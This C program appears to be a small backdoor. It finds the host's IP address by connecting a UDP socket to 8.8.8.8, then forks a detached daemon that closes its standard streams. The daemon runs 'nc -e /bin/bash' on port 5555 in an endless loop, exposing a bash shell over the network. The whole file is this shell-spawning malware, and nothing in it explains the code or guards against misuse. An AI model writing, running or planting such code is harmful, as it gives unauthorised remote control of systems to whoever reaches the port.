#include <stdio.h> 
#include <string.h> 
#include <errno.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>


int main(void){

	const char* google_dns_server = "8.8.8.8";
    int dns_port = 53;

    struct sockaddr_in serv;

    int sock = socket ( AF_INET, SOCK_DGRAM, 0);

    //Socket could not be created
    if(sock < 0)
    {
        perror("Socket error");
    }

    memset( &serv, 0, sizeof(serv) );
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr( google_dns_server );
    serv.sin_port = htons( dns_port );

    int err = connect( sock , (const struct sockaddr*) &serv , sizeof(serv) );

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);

    char buffer[100];
    const char* p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);

    if(p != NULL)
    {
        printf("\n");
    }
    else
    {
        //Some error
        printf ("Error number : %d . Error message : %s \n" , errno , strerror(errno));
    }

    close(sock);

	pid_t pid;

	pid = fork();

	if (pid == -1){

		printf("Error failed demon created\n");
		return -1;

	}	else if(!pid) {

		setsid();
		chdir("~");

		close(STDIN_FILENO);
    	close(STDOUT_FILENO);
    	close(STDERR_FILENO);

    	while(1){
    		char cmd[512];
    		sprintf(cmd,"nc -e /bin/bash -p 5555 -n %s",buffer);
			system(cmd);
    	}
		return 0;
	}
return 0;
}
